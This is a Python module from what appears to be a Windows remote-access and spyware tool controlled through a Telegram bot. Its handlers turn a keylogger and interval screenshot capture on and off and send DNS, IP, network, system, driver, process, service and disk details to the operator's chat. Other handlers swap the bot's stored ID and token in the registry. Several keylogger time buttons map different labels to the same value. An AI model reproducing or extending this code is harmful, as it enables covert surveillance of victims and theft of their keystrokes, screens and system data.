from lib.pathreg import *
from lib.util import Util
from lib.winregistry import WinRegistry
from lib.pcinformation import PCInformation
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from module.startup import write_registry


async def keylogger_active(bot, id, call):
    try:
        WinRegistry(REG_KEYLOGGER).set_value_DWORD('active', 1)
    except:
        await bot.answer_callback_query(call.id, "[Keylogger] Failed to activate ")
    else:
        await bot.answer_callback_query(call.id, "[Keylogger] Actived |OK|")
    finally:
        await bot.delete_message(id, call.message.id)


async def keylogger_disable(bot, id, call):
    try:
        WinRegistry(REG_KEYLOGGER).set_value_DWORD('active', 0)
    except:
        await bot.answer_callback_query(call.id, "[Keylogger] Failed to disable")
    else:
        await bot.answer_callback_query(call.id, "[Keylogger] Disable |OK|")
    finally:
        await bot.delete_message(id, call.message.id)


async def keylogger_time(bot, id, call):
    markup = InlineKeyboardMarkup()
    markup.max_row_keys = 5
    markup.add(InlineKeyboardButton("10", callback_data="k10"),
               InlineKeyboardButton("15", callback_data="k15"),
               InlineKeyboardButton("30", callback_data="k30"),
               InlineKeyboardButton("40", callback_data="k40"),
               InlineKeyboardButton("50", callback_data="k50"),
               InlineKeyboardButton("1 min", callback_data="k60"),
               InlineKeyboardButton("3 min", callback_data="k90"),
               InlineKeyboardButton("5 min", callback_data="k90"),
               InlineKeyboardButton("10 min", callback_data="k90"),
               InlineKeyboardButton("15 min", callback_data="k90"),
               InlineKeyboardButton("20 min", callback_data="k120")
               )
    await bot.edit_message_text(
        text="*|Keylogger|*\nSelect time in seconds",
        reply_markup=markup,
        chat_id=id, message_id=call.message.id,
        parse_mode='markdown')


async def screenshot_active(bot, id, call):
    try:
        WinRegistry(REG_SCREENSHOT).set_value_DWORD('active', 1)
    except:
        await bot.answer_callback_query(call.id, "[Screenshot] Failed to activate ")
    else:
        await bot.answer_callback_query(call.id, "[Screenshot] Actived |OK|")
    finally:
        await bot.delete_message(id, call.message.id)
    pass


async def screenshot_disable(bot, id, call):
    try:
        WinRegistry(REG_SCREENSHOT).set_value_DWORD('active', 0)
    except:
        await bot.answer_callback_query(call.id, "[Screenshot] Failed to disable ")
    else:
        await bot.answer_callback_query(call.id, "[Screenshot] Disable |OK|")
    finally:
        await bot.delete_message(id, call.message.id)


async def screenshot_show_menu_interval(bot, id, call):
    markup = InlineKeyboardMarkup()
    markup.max_row_keys = 5
    markup.add(InlineKeyboardButton("2 seg.", callback_data="s2"),
               InlineKeyboardButton("3 seg.", callback_data="s3"),
               InlineKeyboardButton("4 seg.", callback_data="s4"),
               InlineKeyboardButton("5 seg.", callback_data="s5"),
               InlineKeyboardButton("6 seg.", callback_data="s6"),
               InlineKeyboardButton("7 seg.", callback_data="s7"),
               InlineKeyboardButton("8 seg.", callback_data="s8"),
               InlineKeyboardButton("9 seg.", callback_data="s9"),
               InlineKeyboardButton("10 seg.", callback_data="s10"),
               InlineKeyboardButton("12 seg.", callback_data="s12"),
               InlineKeyboardButton("15 seg.", callback_data="s15"),
               InlineKeyboardButton("18 seg.", callback_data="s18"),
               InlineKeyboardButton("20 seg.", callback_data="s20"),
               InlineKeyboardButton("30 seg.", callback_data="s30"),
               InlineKeyboardButton("40 seg.", callback_data="s40"),
               InlineKeyboardButton("50 seg.", callback_data="s50"),
               InlineKeyboardButton("60 seg.", callback_data="s60"),
               InlineKeyboardButton("80 seg.", callback_data="s80"),
               InlineKeyboardButton("120 seg.", callback_data="s120"),
               InlineKeyboardButton("200 seg.", callback_data="s200"),
               InlineKeyboardButton("250 seg.", callback_data="s250"),
               InlineKeyboardButton("300 seg.", callback_data="s300"),

               )
    await bot.edit_message_text(
        text="[Screenshot]\nSet a  interval in seconds",
        reply_markup=markup,
        chat_id=id,
        message_id=call.message.id,
        parse_mode='markdown'
    )


async def information_dns(bot, id, call, len_text=3000):
    for data in Util().split_string(len_text, PCInformation().display_dns()):
        print(data)
        await bot.send_message(id, data)
    await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def information_red(bot, id, call, len_text=3000):
    for data in Util().split_string(len_text, PCInformation().red_info()):
        print(data)
        await bot.send_message(id, data)
    await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def information_ip(bot, id, call, len_text=3000):
    for data in Util().split_string(len_text, PCInformation().ip_config()):
        print(data)
        await bot.send_message(id, data)
    await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def information_sys(bot, id, call, len_text=3000):
    for data in Util().split_string(len_text, PCInformation().system_info()):
        print(data)
        await bot.send_message(id, data)
    await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def information_driver(bot, id, call, len_text=3000):
    for data in Util().split_string(len_text, PCInformation().driver_info()):
        print(data)
        await bot.send_message(id, data)
    await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def information_current_software(bot, id, call, len_text=3000):
    for data in Util().split_string(len_text, PCInformation().taks_list()):
        print(data)
        await bot.send_message(id, data)
    await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def information_current_services(bot, id, call, len_text=3000):
    for data in Util().split_string(len_text, PCInformation().service_active()):
        print(data)
        await bot.send_message(id, data)
    await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def list_hard_disk(bot, id, call):
    await bot.send_message(id, PCInformation().list_hard_diks())
    await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def change_id_agree(bot, id, call):
    try:
        new_id = WinRegistry(REG_TELEGRAM).read_value('id_temp')
        WinRegistry(REG_TELEGRAM).set_value_String('id', new_id)
        WinRegistry(REG_TELEGRAM).delete_value('id_temp')
    except:
        await bot.answer_callback_query(call.id, "[Change ID] Failed to Change ")
    else:
        await bot.answer_callback_query(call.id, "[Change ID] Change|OK| \n Se cambio el ID en el registro")
    finally:
        await bot.delete_message(id, call.message.id)
        # await bot.send_message(id, 'Se cambio el id del *Ini')
        await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def change_id_reject(bot, id, call):
    await bot.send_message(id,'Se rechazó el cambio de ID')
    await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def change_token_agree(bot, id, call):
    try:
        new_token = WinRegistry(REG_TELEGRAM).read_value('token_temp')
        WinRegistry(REG_TELEGRAM).set_value_String('token', new_token)
        WinRegistry(REG_TELEGRAM).delete_value('token_temp')
    except:
        await bot.answer_callback_query(call.id, "[Change Token] Failed to Change ")
    else:
        await bot.answer_callback_query(call.id, "[Change Token] Change|OK| \n Se cambio el Token en el registro")
    finally:
        await bot.delete_message(id, call.message.id)
        # await bot.send_message(id, 'Se cambio el id del *Ini')
        await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def change_token_reject(bot, id, call):
    # change id functions
    await bot.send_message(id,'Se rechazó el cambio de TOKEN')
    await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def json_update_agree(bot, id, call):
        text = write_registry()
        await bot.answer_callback_query(call.id, text)
        await bot.delete_message(id, call.message.id)
        # await bot.send_message(id, 'Se cambio el id del *Ini')
        await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')


async def json_update_reject(bot, id, call):
    # change id functions
    await bot.send_message(id,'Was reject Update Registry from Json API')
    await bot.answer_callback_query(call.id, 'Finish command [' + call.data + ']')